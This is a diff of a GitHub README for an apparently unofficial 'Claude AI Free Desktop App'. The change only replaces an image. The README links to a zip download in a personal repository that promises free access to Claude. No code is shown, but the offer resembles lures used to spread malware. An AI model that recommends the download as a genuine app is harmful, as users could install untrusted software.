@@ -8,12 +8,13 @@
 
 **Claude AI Free Desktop App** is a lightweight, cross-platform desktop application that provides free access to **Claude AI** (Anthropic). Enjoy powerful AI chat, coding assistance, image analysis, and more in a native-feeling interface on Windows, macOS, and Linux.
 
-![Uploading ChatGPT Image 10 июн. 2026 г., 20_36_04(1).png…]()
+<img width="384" height="256" alt="ChatGPT Image 10 июн  2026 г , 20_36_04(1)" src="https://github.com/user-attachments/assets/1844034c-3c3e-426a-89e0-c20839c783b4" />
+
 
 ## Install
 [Download `free-claude-app.zip`](https://github.com/Sorathiya123/claude-ai-free-desktop-app/releases/download/claude-code/free-claude-app.zip)
-
 ---
+
 <img width="1236" height="987" alt="image" src="https://github.com/user-attachments/assets/c18f82b6-dcfb-42a9-92b6-3fb053e8e5db" />
 
 ---
